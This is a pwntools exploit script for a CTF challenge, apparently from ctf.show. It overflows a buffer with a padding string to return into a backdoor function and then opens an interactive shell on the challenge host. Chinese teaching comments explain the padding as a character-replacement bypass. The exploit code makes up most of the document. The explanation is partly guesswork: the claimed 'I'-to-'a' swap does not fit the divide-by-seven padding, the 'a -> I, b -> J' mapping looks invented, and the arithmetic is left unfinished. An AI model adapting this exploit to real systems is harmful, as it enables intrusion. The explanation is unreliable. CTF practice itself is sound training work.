from pwn import *

p = remote('pwn.challenge.ctf.show', 28174)

backdoor = 0x804902E

payload = b'I' * (0x6C // 7) + b'a' * (0x6c - 0x6C // 7 * 7 + 4) + p32(backdoor)

p.sendline(payload)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2text - 字符替换绕过
2. 题目特点：
   - 程序将输入的某些字符替换成其他字符
   - 例如将'a'替换成'I'，或者反之
3. 绕过原理：
   - 利用替换规则，用会被替换成'a'的字符来填充
   - 本题用'I'填充，程序会将'I'替换成'a'
4. 计算分析：
   0x6C // 7 = 15（整数除法）
   0x6c - 0x6C // 7 * 7 + 4 = 0x6c - 15*7 + 4 = 0x6c - 105 + 4 = 0x6c - 101
   注意：这里计算可能有特殊含义，取决于具体替换规则
5. 常见字符替换：
   - a -> I
   - b -> J
   - ...
   - 利用这种对应关系构造payload
6. 关键点：理解题目过滤/替换机制，逆向构造绕过
"""
